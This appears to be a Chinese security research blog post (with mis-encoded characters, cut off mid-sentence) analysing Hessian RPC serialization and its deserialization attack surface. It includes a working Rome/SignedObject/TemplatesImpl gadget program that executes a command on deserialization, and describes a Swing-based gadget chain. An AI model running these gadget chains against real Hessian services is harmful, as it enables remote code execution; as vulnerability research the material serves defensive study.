è¢«å®¢æˆ·ç«¯è°ƒç”¨ã€‚ä»¥ Servlet é¡¹ç›®ä¸ºä¾‹ï¼Œå’Œå¸¸è§„ Web æœåŠ¡ä¸€æ ·ç»‘å®šè·¯ç”±ï¼Œé€šè¿‡ Tomcat éƒ¨ç½²\nç¤ºä¾‹ï¼šServlet å’Œæ™®é€šçš„ Servlet é…ç½®å·®ä¸å¤šï¼Œä½†æ˜¯éœ€è¦ç»§æ‰¿ HessianServlet\npublic class Hello extends HessianServlet implements Greeting { @Override public String sayHello(String name) { return \u0026quot;Hello, \u0026quot; + name; } } \u0026lt;web-app\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;greeting\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.example.Hello\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;greeting\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; Code Snippet 1: web.xml æ‰“åŒ…æˆ war ä¹‹åç›´æ¥ç”¨ tomcat éƒ¨ç½²å³å¯\ndocker run -it --rm \\ -e 'JPDA_ADDRESS=*:8000' \\ -e JPDA_TRANSPORT=dt_socket \\ -p 8888:8080 \\ -p 9000:8000 \\ -v ./hessian.war:/usr/local/tomcat/webapps/hessian.war \\ tomcat:9.0 \\ /usr/local/tomcat/bin/catalina.sh jpda run å®¢æˆ·ç«¯ä½¿ç”¨ Hessian çš„å·¥å‚ç±»æ„å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå®ç°å¯¹è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨\npublic class Client { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException { String url = \u0026quot;http://localhost:8888/hessian/hello\u0026quot;; HessianProxyFactory factory = new HessianProxyFactory(); Greeting greeting = (Greeting) factory.create(Greeting.class, url); System.out.println(\u0026quot;Hessian server say: \u0026quot; + greeting.sayHello(\u0026quot;client\u0026quot;)); } } Code Snippet 2: Hessian Client Hessian é€šå¸¸æ˜¯åŸºäº HTTP åè®®è¿›è¡Œæ•°æ®ä¼ è¾“çš„ï¼Œä½¿ç”¨çš„æ˜¯ POST æ–¹æ³•\n63 02 00 6d 00 08 73 61 79 48 65 6c 6c 6f 53 00 06 63 6c 69 65 6e 74 7a c..m..sayHelloS..clientz ç¤ºä¾‹ï¼šSpringBoot åœ¨ SpringBoot ä¸­å¯ä»¥ç”¨ org.springframework.remoting.caucho.HessianServiceExporter æ¥æ³¨å†ŒæœåŠ¡ï¼Œæ³¨æ„ remoting æ¨¡å—åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­é»˜è®¤æ˜¯ä¸æä¾›çš„ï¼Œå»ºè®®ä½¿ç”¨ä½ç‰ˆæœ¬è¿›è¡Œæµ‹è¯•\né€šè¿‡æ³¨è§£è¿›è¡Œé…ç½®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œdemo ä»£ç å¯ä»¥å‚è€ƒè¿™é‡Œ\n@Configuration @ComponentScan @EnableAutoConfiguration public class Application { @Autowired private Hello greeting; // æ³¨æ„ç»™ Hello ç±»æ·»åŠ  @Service æ³¨è§£ public static void main(String[] args) { SpringApplication.run(Application.class, args); } @Bean(name = \u0026quot;/hello\u0026quot;) public RemoteExporter helloService() { HessianServiceExporter exporter = new HessianServiceExporter(); exporter.setService(greeting); exporter.setServiceInterface(Greeting.class); return exporter; } } Client ä»£ç å’Œå‰æ–‡ä¸€æ ·ï¼Œè®¿é—® :8080/hello å³å¯è°ƒç”¨ Hessian æœåŠ¡\nè¿œç¨‹è°ƒç”¨è¿‡ç¨‹ HessianServlet HessianServlet æ˜¯ HTTPServlet çš„å­ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸¤ä¸ªæ–¹æ³•ï¼š\ninitï¼šè´Ÿè´£åˆå§‹åŒ– Servlet å¯¹è±¡ serviceï¼šè´Ÿè´£å¤„ç†å’Œå“åº” HTTP è¯·æ±‚ åœ¨ init æ–¹æ³•ä¸­ï¼Œä¸»è¦æ˜¯åˆå§‹åŒ–ä¸€äº›æˆå‘˜å˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬å®šä¹‰çš„ Hello å¯¹è±¡å’Œå®ƒçš„ç±»å‹ä¿¡æ¯ï¼›è¿˜æœ‰ skeleton å¯¹è±¡ï¼Œç”¨æ¥å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®ï¼Œå®Œæˆè¿œç¨‹æ–¹æ³•è°ƒç”¨\nservice æ–¹æ³•æ˜¯æ•´ä¸ª RPC å¤„ç†è¿‡ç¨‹çš„å…¥å£ç‚¹ï¼Œæˆ‘ä»¬ä»è¿™é‡Œå¼€å§‹æ¢ç´¢ Hessian çš„æœåŠ¡è°ƒç”¨å®ç°é€»è¾‘\né¦–å…ˆä¼šæ£€æŸ¥æ˜¯ä¸æ˜¯ POST è¯·æ±‚ï¼Œå¦‚æœä¸æ˜¯çš„è¯ä¼šç›´æ¥è¿”å› 500 é”™è¯¯ç  æ¥ç€ç”¨ ServiceContext ç±»ä¿å­˜ä¸€äº›ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆ request ã€response ç­‰ç­‰ï¼‰ åˆå§‹åŒ–åºåˆ—åŒ–å·¥å‚å¯¹è±¡ SerializerFactory å†è¿›å…¥ com.caucho.hessian.server.HessianSkeleton#invoke(InputStream, OutputStream, SerializerFactory) æ–¹æ³• HessianSkeleton HessianSkeleton æ˜¯ AbstractSkeleton çš„å­ç±»ï¼Œå…¶åŠŸèƒ½ç±»ä¼¼äºåŠ¨æ€ä»£ç†ï¼Œå°†å®é™…çš„æœåŠ¡å¯¹è±¡è¿›è¡Œå°è£…ï¼Œæä¾›ç»™å®¢æˆ·ç«¯è°ƒç”¨ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­å°±æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ•°æ®çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–\nAbstractSkeleton åˆå§‹åŒ–æ—¶ä¼šä»æœåŠ¡å¯¹è±¡çš„æ¥å£ï¼ˆç±»ï¼‰ä¸­è·å–æ‰€æœ‰æ–¹æ³•å¹¶ä¿å­˜åœ¨ _methodMap ä¸­\nprotected AbstractSkeleton(Class apiClass) { _apiClass = apiClass; Method []methodList = apiClass.getMethods(); for (int i = 0; i \u0026lt; methodList.length; i++) { Method method = methodList[i]; if (_methodMap.get(method.getName()) == null) _methodMap.put(method.getName(), methodList[i]); Class []param = method.getParameterTypes(); String mangledName = method.getName() + \u0026quot;__\u0026quot; + param.length; _methodMap.put(mangledName, methodList[i]); _methodMap.put(mangleName(method, false), methodList[i]); } } æ¯ä¸ªæ–¹æ³•ä¼šåœ¨ _methodMap ä¸­ç”Ÿæˆä¸‰ç»„é”®å€¼å¯¹ï¼Œkey åˆ†åˆ«ä¸ºï¼š\n1. æ–¹æ³•å 2. æ–¹æ³•å__å‚æ•°ä¸ªæ•° 3. æ–¹æ³•å_å‚æ•°1ç±»å‹_å‚æ•°2ç±»å‹ æœåŠ¡å¯¹è±¡åˆ™ä¿å­˜åœ¨ç§æœ‰å±æ€§ HessianSkeleton#_service ä¸­\nå®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡æ—¶è°ƒç”¨ HessianSkeleton#invoke ï¼Œä¼šè¯»å–äºŒè¿›åˆ¶æ•°æ®çš„å¤´éƒ¨åˆ¤æ–­åè®®çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚å‰æ–‡çš„æ•°æ®ä»¥ 63 02 å¼€å¤´ï¼ŒæœåŠ¡ç«¯åˆ™ä¼šç”¨ HessianInput è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åç”¨ Hessian2Output å¯¹è¿”å›æ•°æ®è¿›è¡Œåºåˆ—åŒ–ï¼ˆCALL_1_REPLY_2ï¼‰\npublic HeaderType readHeader(InputStream is) throws IOException { int code = is.read(); int major = is.read(); int minor = is.read(); switch (code) { case -1: throw new IOException(\u0026quot;Unexpected end of file for Hessian message\u0026quot;); case 'c': if (major \u0026gt;= 2) return HeaderType.CALL_1_REPLY_2; else return HeaderType.CALL_1_REPLY_1; case 'r': return HeaderType.REPLY_1; case 'H': return HeaderType.HESSIAN_2; default: throw new IOException((char) code + \u0026quot; 0x\u0026quot; + Integer.toHexString(code) + \u0026quot; is an unknown Hessian message code.\u0026quot;); } } Code Snippet 3: com.caucho.hessian.io.HessianInputFactory#readHeader switch (header) { case CALL_1_REPLY_1: in = _hessianFactory.createHessianInput(is); out = _hessianFactory.createHessianOutput(os); break; case CALL_1_REPLY_2: in = _hessianFactory.createHessianInput(is); out = _hessianFactory.createHessian2Output(os); break; case HESSIAN_2: in = _hessianFactory.createHessian2Input(is); in.readCall(); out = _hessianFactory.createHessian2Output(os); break; default: throw new IllegalStateException(header + \u0026quot; is an unknown Hessian call\u0026quot;); } Code Snippet 4: com.caucho.hessian.server.HessianSkeleton#invoke è®¾ç½®å¥½è¾“å…¥è¾“å‡ºæµä¹‹åï¼Œæ ¹æ®å‰æ–‡æåˆ°çš„ _methodMap æ‰¾åˆ°è¦æ‰§è¡Œçš„æ–¹æ³•ï¼Œé€šè¿‡ HessianSkeleton#_service è¿›è¡Œåå°„è°ƒç”¨ï¼Œå†å°†è°ƒç”¨ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯\nåè®®ç‰ˆæœ¬ æˆ‘ä»¬ç°åœ¨çŸ¥é“ï¼Œå³ä½¿ Hessian åè®®å·²ç»è¿­ä»£åˆ° 2.0 ç‰ˆæœ¬ï¼Œä»ç„¶å¯ä»¥å’Œ 1.0 ç‰ˆæœ¬æ··ç”¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ CALL_1_REPLY_2ï¼Œå³å®¢æˆ·ç«¯å‘é€ 1.0 åè®®æ•°æ®ï¼ŒæœåŠ¡ç«¯è¿”å› 2.0 åè®®æ•°æ®\næƒ³è¦å®¢æˆ·ç«¯å‘é€ 2.0 åè®®æ•°æ®éœ€è¦æ˜¾å¼è®¾ç½®\nHessianProxyFactory factory = new HessianProxyFactory(); factory.setHessian2Request(true); åºåˆ—åŒ–è¿‡ç¨‹ Hessian å®šä¹‰äº† AbstractHessianInput/AbstractHessianOutput ä¸¤ä¸ªæŠ½è±¡ç±»ï¼Œç”¨æ¥æä¾›åºåˆ—åŒ–æ•°æ®çš„è¯»å–å’Œå†™å…¥åŠŸèƒ½ã€‚ä»å‰æ–‡æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæ ¹æ®åè®®ç‰ˆæœ¬ä¸åŒï¼Œæä¾›äº† Hessian/Hessian2/Burlap ç­‰å‡ ç§ä¸åŒçš„å…·ä½“å®ç°\næˆ‘ä»¬å…ˆé€šè¿‡ Client ç¤ºä¾‹ç®€å•çœ‹çœ‹åºåˆ—åŒ–çš„è¿‡ç¨‹\né¦–å…ˆè¦ä½¿ç”¨ HessianProxyFactory æ¥åˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡æ¥ä»£ç†è¿œç¨‹çš„æœåŠ¡å¯¹è±¡ï¼Œå½“è°ƒç”¨ä»»æ„æ–¹æ³•æ—¶å®é™…æ‰§è¡Œçš„æ˜¯ com.caucho.hessian.client.HessianProxy#invoke ï¼Œå‘é€è¯·æ±‚æ—¶é€šè¿‡ HessianOutput#writeObject æ¥å†™å…¥åºåˆ—åŒ–æ•°æ®\nwriteObject:315, HessianOutput (com.caucho.hessian.io) call:132, HessianOutput (com.caucho.hessian.io) sendRequest:293, HessianProxy (com.caucho.hessian.client) invoke:171, HessianProxy (com.caucho.hessian.client) sayHello:-1, $Proxy0 (com.sun.proxy) main:13, Client æ ¹æ®ä¸åŒçš„åºåˆ—åŒ–æ•°æ®ç±»å‹ï¼Œä¼šä»å·¥å‚ç±»ä¸­è·å–å¯¹åº”çš„åºåˆ—åŒ–å™¨å®ç°ï¼Œé€šå¸¸æ˜¯ BasicSerializer å®ç°\npublic void writeObject(Object object) throws IOException { if (object == null) { writeNull(); return; } Serializer serializer; serializer = _serializerFactory.getSerializer(object.getClass()); serializer.writeObject(object, this); } Code Snippet 5: com.caucho.hessian.io.HessianOutput#writeObject ContextSerializerFactory#_serializerClassMap åœ¨å¼€å§‹è¿›è¡Œæ•°æ®åºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin ï¼Œåœ¨ 1.0 ç‰ˆæœ¬æ—¶ä¼šæŠŠæ‰€æœ‰æ•°æ®éƒ½å†™åœ¨ä¸€ä¸ª Map å®¹å™¨é‡Œé¢ï¼ŒHessian2Output åˆ™é‡å†™äº†è¯¥æ–¹æ³•ï¼Œæ ¹æ®ç±»å‹å†™å…¥å…¶æè¿°ä¿¡æ¯\n/** * Writes the object header to the stream (for Hessian 2.0), or a * Map for Hessian 1.0. Object writers will call * ... */ public int writeObjectBegin(String type) throws IOException { writeMapBegin(type); return -2; } Serializable å’Œ transient é€æ­¥è°ƒè¯• HessianOutput#writeObject çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ä¸¤ä¸ªæ¯”è¾ƒå…³é”®çš„åˆ¤æ–­é€»è¾‘ã€‚åœ¨å·¥å‚ç±»è·å–åºåˆ—åŒ–å™¨æ—¶ï¼Œä¼šåˆ¤æ–­ç›®æ ‡ç±»æœ‰æ²¡æœ‰å®ç° Serializable æ¥å£ï¼Œè¿™å¾ˆåˆç†ï¼Œä½†æ¡ä»¶æ˜¯è¿™æ ·çš„ï¼š\nif (! Serializable.class.isAssignableFrom(cl) \u0026amp;\u0026amp; ! _isAllowNonSerializable) { throw new IllegalStateException(\u0026quot;Serialized class \u0026quot; + cl.getName() + \u0026quot; must implement java.io.Serializable\u0026quot;); } ä¹Ÿå°±æ˜¯è¿˜æœ‰ä¸€ä¸ª _isAllowNonSerializable å±æ€§å¯ä»¥è®©æ²¡æœ‰å®ç° Serializable æ¥å£çš„ç±»è¿›è¡Œåºåˆ—åŒ–\nç»§ç»­è°ƒè¯•ï¼Œå·¥å‚ç±»é»˜è®¤è·å–çš„åºåˆ—åŒ–å™¨æ˜¯ UnsafeSerializerï¼Œå®ƒä¼šè·³è¿‡æ‰€æœ‰è¢« transient å’Œ static ä¿®é¥°çš„æˆå‘˜å˜é‡\nif (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers())) { continue; } Code Snippet 6: com.caucho.hessian.io.UnsafeSerializer#introspect ååºåˆ—åŒ–è¿‡ç¨‹ ååºåˆ—åŒ–è¿‡ç¨‹å’Œ AbstractHessianInput çš„å­ç±»å¯†åˆ‡ç›¸å…³ï¼Œå…¥å£æ–¹æ³•å’ŒåŸç”Ÿååºåˆ—åŒ–ä¸€æ ·ï¼ˆåå­—ä¸€æ ·ï¼‰éƒ½æ˜¯ readObjectï¼Œä»¥ HessianInput ä¸ºä¾‹ï¼Œåœ¨ readObject æ–¹æ³•ä¸­ä¼šæ ¹æ® tag åˆ¤æ–­æ•°æ®çš„ç±»å‹ï¼Œç„¶åä½¿ç”¨å¯¹åº”çš„ Deserializer å»å¤„ç†ã€‚ç”±äº Hessian1.0 ä¼šæŠŠåºåˆ—åŒ–æ•°æ®éƒ½æ”¾åœ¨ä¸€ä¸ª Map ä¸­ï¼Œæ‰€ä»¥ä¼šåƒä¸‹å›¾ä¸€æ ·é€šè¿‡ readMap å¤„ç†ï¼š\nåœ¨ readMap ä¸­ä¼šå°†æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åå°†å¯¹è±¡æ”¾åˆ° HashMap æˆ–è€… TreeMap çš„é”®å€¼å¯¹é‡Œ\npublic Object readMap(AbstractHessianInput in) throws IOException { Map map; if (_type == null) map = new HashMap(); else if (_type.equals(Map.class)) map = new HashMap(); else if (_type.equals(SortedMap.class)) map = new TreeMap(); else { try { map = (Map) _ctor.newInstance(); } catch (Exception e) { throw new IOExceptionWrapper(e); } } in.addRef(map); while (! in.isEnd()) { map.put(in.readObject(), in.readObject()); } in.readEnd(); return map; } çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬åº”è¯¥æ„è¯†åˆ° Hessian ååºåˆ—åŒ–æ¼æ´çš„å…¥å£åœ¨å“ªäº†ï¼Œè™½ç„¶åœ¨ååºåˆ—è¿‡ç¨‹ä¸­ä¸ä¼šåƒåŸç”Ÿååºåˆ—åŒ–ä¸€æ ·è§¦å‘ readObject æ–¹æ³•ï¼Œä¹Ÿä¸ä¼šåƒ FastJSON ä¸€æ ·è°ƒç”¨ getter/setterï¼Œä½†è¿™ä¸ª readMap æ–¹æ³•ä¸­çš„ map.put æ“ä½œæˆäº†æ¼ç½‘ä¹‹é±¼\nä¼—æ‰€å‘¨çŸ¥ï¼ŒHashMap åœ¨æ‰§è¡Œ put æ“ä½œæ—¶ä¼šè°ƒç”¨ key çš„ hashCode å’Œ equals æ–¹æ³•ï¼Œè¿™åœ¨å¾ˆå¤šç°æœ‰çš„é“¾ä¸­è¢«åˆ©ç”¨åˆ°ï¼›è€Œ TreeMap åœ¨æ‰§è¡Œ put æ“ä½œæ—¶ä¹Ÿä¼šè°ƒç”¨ key çš„ compareTo æ–¹æ³•\nå¦‚æœæ˜¯ Hessian2.0 çš„åºåˆ—åŒ–æ•°æ®ï¼Œæ•°æ®æµçš„ tag æ˜¯ C ï¼Œæœ€åä¼šæ ¹æ®ç±»å‹æè¿°ä¿¡æ¯ç”± sun.misc.Unsafe#allocateInstance æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–å¯¹è±¡çš„åˆå§‹åŒ–ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ª native æ–¹æ³•ï¼Œæ²¡æœ‰åŠæ³•è¿›è¡Œåˆ©ç”¨\ninstantiate:306, UnsafeDeserializer (com.caucho.hessian.io) readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readObject:1677, Hessian2Input (com.caucho.hessian.io) invoke:296, HessianSkeleton (com.caucho.hessian.server) invoke:198, HessianSkeleton (com.caucho.hessian.server) invoke:399, HessianServlet (com.caucho.hessian.server) service:379, HessianServlet (com.caucho.hessian.server) åˆ©ç”¨é“¾åˆ†æ æ ¹æ®ä»¥ä¸Šååºåˆ—åŒ–è¿‡ç¨‹çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡º Hessian çš„åˆ©ç”¨é“¾çš„ç‰¹å¾ï¼š\nå…¥å£æ–¹æ³•æ˜¯ hashCode/equals/compareTo å…¶ä¸­ä¹‹ä¸€ åˆ©ç”¨ç±»å¯ä»¥ä¸å®ç° Serializable æ¥å£ï¼Œä½†æ˜¯ transient æˆå‘˜å˜é‡ä¸èƒ½åˆ©ç”¨ åˆ©ç”¨ç±»çš„ readObject ä¸ä¼šè‡ªåŠ¨è§¦å‘ï¼Œé™¤éåœ¨åˆ©ç”¨é“¾ä¸Šæ˜¾å¼è°ƒç”¨ï¼ˆäºŒæ¬¡ååºåˆ—åŒ–ï¼‰ Rome Rome æ˜¯ä¸€ä¸ªç”¨äº RSS å’Œ Atom è®¢é˜…çš„ Java æ¡†æ¶ï¼Œåœ¨ marshalsec ä¸­å°±ç”¨å®ƒçš„ ToStringBean å’Œ EqualsBean ç­‰ç±»æ„é€ å‡ºäº† Hessian åˆ©ç”¨é“¾\nEqualsBean åœ¨ hashCode ä¸­å¯ä»¥æ‰§è¡Œä»»æ„å¯¹è±¡çš„ toString æ–¹æ³•\npublic class EqualsBean implements Serializable { public int hashCode() { return beanHashCode(); } // ... public int beanHashCode() { return obj.toString().hashCode(); } } è€Œ ToStringBean#toString å¯ä»¥è°ƒç”¨ä»–å°è£…ç±»çš„å…¨éƒ¨æ— å‚ getter æ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ JdbcRowSetImpl#getDatabaseMetaData è¿›è¡Œ JNDI æ³¨å…¥\nåœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹è¿˜å¯ä»¥åˆ©ç”¨ java.security.SignedObject#getObject è§¦å‘åŸç”Ÿååºåˆ—åŒ–é“¾ï¼ˆäºŒæ¬¡ååºåˆ—åŒ–ï¼‰\ngetObject:179, SignedObject (java.security) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:338, HashMap (java.util) put:611, HashMap (java.util) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:1160, HessianInput (com.caucho.hessian.io) Code Snippet 1: SignedObject é“¾è°ƒç”¨æ ˆ åˆ©ç”¨ TemplatesImpl åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰§è¡Œå‘½ä»¤ public class SignedObjectGadget { public static void main(String[] args) throws Exception { byte[] code = getTemplates(); byte[][] codes = {code}; TemplatesImpl templates = new TemplatesImpl(); setValue(templates, \u0026quot;_tfactory\u0026quot;, new TransformerFactoryImpl()); setValue(templates, \u0026quot;_name\u0026quot;, \u0026quot;Aiwin\u0026quot;); setValue(templates, \u0026quot;_class\u0026quot;, null); setValue(templates, \u0026quot;_bytecodes\u0026quot;, codes); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(String.class, \u0026quot;aiwin\u0026quot;); HashMap hashMap = new HashMap(); hashMap.put(equalsBean, \u0026quot;aaa\u0026quot;); setValue(equalsBean, \u0026quot;beanClass\u0026quot;, ToStringBean.class); setValue(equalsBean, \u0026quot;obj\u0026quot;, toStringBean); //SignedObject KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026quot;DSA\u0026quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(\u0026quot;DSA\u0026quot;)); ToStringBean toStringBean_sign = new ToStringBean(SignedObject.class, signedObject); EqualsBean equalsBean_sign = new EqualsBean(String.class, \u0026quot;aiwin\u0026quot;); HashMap hashMap_sign = new HashMap(); hashMap_sign.put(equalsBean_sign, \u0026quot;aaa\u0026quot;); setValue(equalsBean_sign, \u0026quot;beanClass\u0026quot;, ToStringBean.class); setValue(equalsBean_sign, \u0026quot;obj\u0026quot;, toStringBean_sign); String result = Hessian_serialize(hashMap_sign); Hessian_unserialize(result); } public static void setValue(Object obj, String name, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026quot;Test\u0026quot;); ctClass.setSuperclass(classPool.get(\u0026quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026quot;)); String block = \u0026quot;Runtime.getRuntime().exec(\\\u0026quot;kcalc\\\u0026quot;);\u0026quot;; ctClass.makeClassInitializer().insertBefore(block); return ctClass.toBytecode(); } public static String Hessian_serialize(Object object) throws IOException { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.writeObject(object); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); } public static void Hessian_unserialize(String obj) throws IOException { byte[] code = Base64.getDecoder().decode(obj); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(code); HessianInput hessianInput = new HessianInput(byteArrayInputStream); hessianInput.readObject(); } } Swing è¿™æ˜¯ä¸€æ¡ JDK åŸç”Ÿçš„ååºåˆ—åŒ–é“¾ï¼Œè¿™æ¡é“¾çš„ sink ç‚¹åœ¨ sun.swing.SwingLazyValue#createValue æ–¹æ³•ä¸­\npublic Object createValue(UIDefaults var1) { try { ReflectUtil.checkPackageAccess(this.className); Class var2 = Class.forName(this.className, true, (ClassLoader)null); if (this.methodName != null) { Class[] var6 = this.getClassArray(this.args); Method var7 = var2.getMethod(this.methodName, var6); this.makeAccessible(var7); // æ³¨æ„ var2 æ˜¯ä¸€ä¸ª Class å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½åˆ©ç”¨ç±»æ–¹æ³• return var7.invoke(var2, this.args); } else { Class[] var3 = this.getClassArray(this.args); Constructor var4 = var2.getConstructor(var3); this.makeAccessible(var4); return var4.newInstance(this.args); } } catch (Exception var5) { return null; } } è¿™ä¸ªæ–¹æ³•æœ‰ä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å®š methodName æ¥åå°„è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å°† methodName ç½®ç©ºæ¥è§¦å‘ä¸€ä¸ªç±»çš„åˆå§‹åŒ–æ“ä½œã€‚å…¶å®è¿™ä¸ªç±»åœ¨ Xstream çš„ CVE-2021-21346 å°±è¢«åˆ©ç”¨è¿‡ï¼Œå½“æ—¶çš„ gadget ä¸ºï¼š\nRdn$RdnEntry#compareTo-\u0026gt; XString#equal-\u0026gt; MultiUIDefaults#toString-\u0026gt; UIDefaults#get-\u0026gt; UIDefaults#getFromHashTable-\u0026gt; UIDefaults$LazyValue#createValue-\u0026gt; SwingLazyValue#createValue-\u0026gt; InitialContext#doLookup() ç”±äº MultiUIDefaults ä¸æ˜¯ public ç±»ï¼Œè¿™ä¸ª gadget æ— æ³•å¤ç”¨åˆ° Hessian ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…¥å£è§¦å‘ UIDefaults#get\næ‰¾åˆ°ä»£æ›¿å“ javax.activation.MimeTypeParameterList#toString ï¼Œå®ƒä¼šæ‰§è¡Œ parameters æˆå‘˜å˜é‡çš„ get æ–¹æ³•\npublic String toString() { StringBuffer buffer = new StringBuffer(); buffer.ensureCapacity(this.parameters.size() * 16); Enumeration keys = this.parameters.keys(); while(keys.hasMoreElements()) { String key = (String)keys.nextElement(); buffer.append(\u0026quot;; \u0026quot;); buffer.append(key); buffer.append('='); buffer.append(quote((String)this.parameters.get(key))); } return buffer.toString(); } è‡³äº toString æ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨ Hessian2Input#expect è§¦å‘ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥æ‰“å°ç±»å‹é”™è¯¯ä¿¡æ¯çš„æ–¹æ³•ï¼ŒHessian åœ¨ååºåˆ—åŒ–æ—¶éœ€è¦ä»æ•°æ®æµè¯»å–æ ‡å¿—å­—èŠ‚ï¼ˆ tag ï¼‰æ¥åˆ¤æ–­æ¥ä¸‹æ¥çš„æ•°æ®æ˜¯ä»€ä¹ˆç±»å‹ï¼Œä»¥æ­¤æ¥ä¿è¯ä½¿ç”¨æ­£ç¡®çš„æ–¹æ³•è¿˜åŸå¯¹è±¡ï¼Œæ¯”å¦‚ä¹‹å‰æˆ‘ä»¬çœ‹åˆ°è¿‡ M ä»£è¡¨ Map ç±»å‹çš„å¯¹è±¡ï¼Œä¼šè°ƒç”¨ readMap æ–¹æ³•å¤„ç†\nå½“è¯»å–åˆ°çš„ tag å’Œé¢„æœŸä¸ç¬¦æ—¶ï¼Œä¼šè°ƒç”¨ Hessian2Input#expect æ¥è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œè¿™æ—¶ä¼šå°†å‰©ä¸‹çš„æ•°æ®ç”¨ readObject æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åå’Œå­—ç¬¦ä¸²æ‹¼æ¥ç”Ÿæˆé”™è¯¯ä¿¡æ¯ï¼Œè¿™æ—¶å€™ä¼šéšå¼æ‰§è¡Œå¯¹è±¡çš„ toString æ–¹æ³•\nObject obj = readObject(); if (obj != null) { return error(\u0026quot;expected \u0026quot; + expect + \u0026quot; at 0x\u0026quot; + Integer.toHexString(ch \u0026amp; 0xff) + \u0026quot; \u0026quot; + obj.getClass().getName() + \u0026quot; (\u0026quot; + obj + \u0026quot;)\u0026quot; + \u0026quot;\\n \u0026quot; + context + \u0026quot;\u0026quot;); é‚£ä¹ˆæ€ä¹ˆè§¦å‘ Hessian2Input#expect å‘¢ï¼Ÿç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°ï¼Œåœ¨ååºåˆ—åŒ– MimeTypeParameterList æˆ–è€…å…¶ä»–è‡ªå®šä¹‰å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨ readObjectDefinition è·å–ç±»åä¿¡æ¯ï¼Œè¿™æ—¶å°±ä¼šä½¿ç”¨ readString 